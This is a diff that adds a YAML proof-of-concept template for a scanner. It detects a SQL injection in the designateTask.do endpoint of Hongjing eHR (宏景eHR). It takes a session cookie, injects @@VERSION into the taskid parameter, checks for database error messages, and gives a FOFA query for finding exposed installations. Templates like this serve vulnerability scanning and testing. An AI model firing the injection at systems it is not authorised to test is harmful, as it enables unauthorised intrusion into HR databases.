@@ -1,0 +1,29 @@
+id: poc-yaml-hongjing-ehr-designatetask-sqli
+info:
+  name: 宏景eHR designateTask.do SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: GET
+  path: /module/system/qrcard/mobilewrite/qrcardmain.jsp
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"JSESSIONID=(?P<cookie>[^;]+);")
+- method: GET
+  path: /performance/objectiveManage/designateTask.do?b_save=&taskid=@@VERSION
+  headers:
+    Cookie: JSESSIONID={{.cookie}}
+  expression: 'status_code == 200 &&
+
+    matches(gbk_decode(body),"转换成数据类型(.*?)时失败") &&
+
+    matches(gbk_decode(body),"在将(.*?)值") &&
+
+    (contains(body,"SQL Server") || contains(body,"MySQL"))
+
+    '
+variables: {}
+transport: http
